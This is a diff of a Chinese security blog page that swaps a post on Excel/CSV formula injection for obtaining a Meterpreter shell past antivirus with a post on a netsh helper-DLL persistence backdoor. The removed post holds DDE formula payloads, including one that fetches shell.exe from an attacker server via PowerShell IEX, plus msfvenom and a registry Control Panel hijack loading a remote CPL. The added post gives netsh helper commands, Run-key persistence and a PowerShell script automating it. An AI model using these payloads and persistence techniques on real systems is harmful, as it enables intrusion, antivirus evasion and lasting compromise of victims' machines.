@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>CSV注入绕过杀软获取meterpreter | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="CSV注入绕过杀软获取meterpreter | 九世的博客">
+  <title>netsh后门 | 九世的博客</title>
+  <meta name="keywords" content=" 权限维持 ">
+  <meta name="description" content="netsh后门 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区">
 <meta property="og:type" content="website">
@@ -1147,9 +1147,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-CSV注入绕过杀软获取meterpreter" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-netsh后门" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">CSV注入绕过杀软获取meterpreter</h1>
+        <h1 class="article-title">netsh后门</h1>
     
     <div class="article-meta">
         
@@ -1158,14 +1158,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">权限维持</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-06-06 21:38:51">2019-06-06 21:32</time>
+        创建时间:<time class="date" title="更新时间: 2019-11-08 23:58:05">2019-11-08 23:45</time>
         
     </div>
     <div class="article-meta">
@@ -1187,7 +1187,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSV注入"><span class="toc-text">CSV注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#说明"><span class="toc-text">说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例子"><span class="toc-text">例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xls反弹meterpreter"><span class="toc-text">xls反弹meterpreter</span></a></li></ol></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -1202,42 +1202,34 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在学习CSV注入的时候，有个想法就是能不能执行恶意xls绕过有杀软主机返回meterpreter<br><img src="https://s2.ax1x.com/2019/06/06/Vdcp5T.png" alt=""></p>
-<h2 id="CSV注入"><a href="#CSV注入" class="headerlink" title="CSV注入"></a>CSV注入</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>CSV又称xls注入或excel注入，通过在excel表里面进行操作调用其他进程</p>
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre><code>@SUM(1+1)*cmd|&#39; /C calc&#39;!A0
-=cmd|&#39; /C notepad&#39;!&#39;A1&#39;
-=cmd|&#39;/C powershell IEX(wget attacker_server/shell.exe)&#39;!A0
-</code></pre><p>cmd为你要执行的查询可以换成别的，比如说将第一个变成</p>
-<pre><code>@SUM(1+1)*notepad|&#39; demo.txt&#39;!A0
-</code></pre><p><img src="https://s2.ax1x.com/2019/06/06/VdEzDO.png" alt=""></p>
-<p>当打开xls之后点击信任源就会执行<br><img src="https://s2.ax1x.com/2019/06/06/VdVP5d.png" alt=""></p>
-<h3 id="xls反弹meterpreter"><a href="#xls反弹meterpreter" class="headerlink" title="xls反弹meterpreter"></a>xls反弹meterpreter</h3><p>环境：</p>
-<pre><code>windows server 2008 --- 192.168.241.129 开启了网络共享
-kali --- 192.168.241.136
-windows 7 --- 192.168.241.134 安有360服务
-</code></pre><p>先做一个简单的测试：<br>kali生成一个简单的弹calc的dll,并将dll后缀名改为cpl</p>
-<pre><code>msfvenom -p windows/exec CMD=calc.exe -f dll &gt; hook.dll
-mv hook.dll hook.cpl
-</code></pre><p><img src="https://s2.ax1x.com/2019/06/06/VddgIJ.md.png" alt=""></p>
-<p>将这个hook.cpl移到windows server 2008的网络共享里<br><img src="https://s2.ax1x.com/2019/06/06/VddIsK.png" alt=""></p>
-<p>在windows7执行 （发现360并不拦截这个路径，火绒也试过）</p>
-<pre><code>reg add &quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls&quot; /t REG_SZ /d &quot;\\192.168.241.129\Public\hook.cpl&quot;
-</code></pre><p><img src="https://s2.ax1x.com/2019/06/06/Vdw5fs.md.png" alt=""></p>
-<p>此时打开控制面板会弹出calc<br><img src="https://s2.ax1x.com/2019/06/06/VdwTlq.md.png" alt=""></p>
-<p>使用Procmon跟踪进程发现控制面板会寻找这个注册表路径并加载里面的cpl<br><img src="https://s2.ax1x.com/2019/06/06/VdwqmT.png" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/06/06/Vd0Zhd.md.png" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/06/06/Vd0n1I.png" alt=""></p>
-<p>远程加载之后我回去windows server 2008发现个事情<br>dll变成了这样，而且一删除就会重新出现= =。。后面问了Yansu才知道怎么回事<br>(PS：如果要删除，先删除目标加里的注册表路径，然后在共享的那台机里重启，重新进入系统后在访问共享删除)<br><img src="https://s2.ax1x.com/2019/06/06/VdB5Mq.png" alt=""></p>
-<p>实验结束，回到上一层话题，使用xls执行cmd命令添加这个注册表路径并执行控制面板获取meterpreter<br>流程大概是这样的：<br><img src="https://s2.ax1x.com/2019/06/06/Vd0y4J.png" alt=""></p>
-<p>生成dll改名为cpl<br><img src="https://s2.ax1x.com/2019/06/06/Vd0jDf.md.png" alt=""></p>
-<p>重新放入hook.cpl<br><img src="https://s2.ax1x.com/2019/06/06/VdDDfJ.md.png" alt=""></p>
-<p>msf开启监听<br><img src="https://s2.ax1x.com/2019/06/06/VdD4te.png" alt=""></p>
-<p>在xls插入以下语句</p>
-<pre><code>=cmd|&#39; /C reg add &quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls&quot; /t REG_SZ /d &quot;\\192.168.241.129\Public\hook.cpl&quot;&#39;!_xlbgnm.A1
-</code></pre><p><img src="https://s2.ax1x.com/2019/06/06/Vdr4bV.md.png" alt=""></p>
-<p>打开控制面板触发<br><img src="https://s2.ax1x.com/2019/06/06/VdytOI.png" alt=""></p>
-<p>gif动图<br><img src="https://s2.ax1x.com/2019/06/06/Vd6ucj.gif" alt="Vd6ucj.gif"></p>
-<p>参考文章：<br><a href="http://reverse-tcp.xyz/pentest/red%20team/2017/12/28/windows-to-download-and-execute-arbitrary-code.html" target="_blank" rel="noopener">http://reverse-tcp.xyz/pentest/red%20team/2017/12/28/windows-to-download-and-execute-arbitrary-code.html</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection</a></p>
+        <blockquote>
+<p>Netsh是Windows实用程序，管理员可以使用它来执行与系统的网络配置有关的任务，并在基于主机的Windows防火墙上进行修改。可以通过使用DLL文件来扩展Netsh功能。此功能使红色团队可以使用此工具来加载任意DLL，以实现代码执行并因此实现持久性。但是，此技术的实现需要本地管理员级别的特权。</p>
+</blockquote>
+<p>通过msfvenom生成一个dll</p>
+<pre><code>msfvenom -p widnows/x64/exec CMD=calc.exe -f dll &gt; test.dll
+</code></pre><p><img src="https://s2.ax1x.com/2019/11/08/Mei1yV.png" alt="Mei1yV.png"></p>
+<p>在受害机执行</p>
+<pre><code>netsh add helper &lt;DLL_PATH&gt;
+</code></pre><p><img src="https://s2.ax1x.com/2019/11/08/MeiUY9.png" alt="MeiUY9.png"></p>
+<p>之后netsh一运行就会加载DLL（加载完DLL后自动运行netsh，关闭之后。再此之后执行的netsh都会加载dll）<br><img src="https://s2.ax1x.com/2019/11/08/MeiwS1.png" alt="MeiwS1.png"></p>
+<p>如果要实现启动系统自动运行netsh，得修改注册表</p>
+<pre><code> reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Pentestlab /t REG_SZ /d &quot;C:\Windows\SysWOW64\netsh&quot;;
+ reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run\\ -v pentestlab -d &#39;C:\Windows\SysWOW64\netsh&#39;;
+</code></pre><p>这里我用powershell实现了一个简单的功能</p>
+<pre><code class="powershell"> param (
+    [string]$path = &quot;NULL&quot;
+ )
+ if($path -eq &quot;NULL&quot;){
+    Write-Host &quot;netsh.ps1 -path &lt;DLL_path&gt;&quot;;
+    exit(0);
+ }else{
+    write-host &quot;[*] reboot run netsh&quot;;
+    reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Pentestlab /t REG_SZ /d &quot;C:\Windows\SysWOW64\netsh&quot;;
+    reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run\\ -v pentestlab -d &#39;C:\Windows\SysWOW64\netsh&#39;;
+    netsh add helper $path;
+}
+</code></pre>
+<p><img src="https://s2.ax1x.com/2019/11/08/Mei0Qx.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1247,12 +1239,12 @@ mv hook.dll hook.cpl
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>CSV注入绕过杀软获取meterpreter</p>
+    <p><span class="copy-title">文章标题:</span>netsh后门</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-06-06, 21:32:48</p>
-    <p><span class="copy-title">最后更新:</span>2019-06-06, 21:38:51</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/ebb51b81.html" title="CSV注入绕过杀软获取meterpreter">http://422926799.github.io/posts/ebb51b81.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-11-08, 23:45:13</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-08, 23:58:05</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/b31575cf.html" title="netsh后门">http://422926799.github.io/posts/b31575cf.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
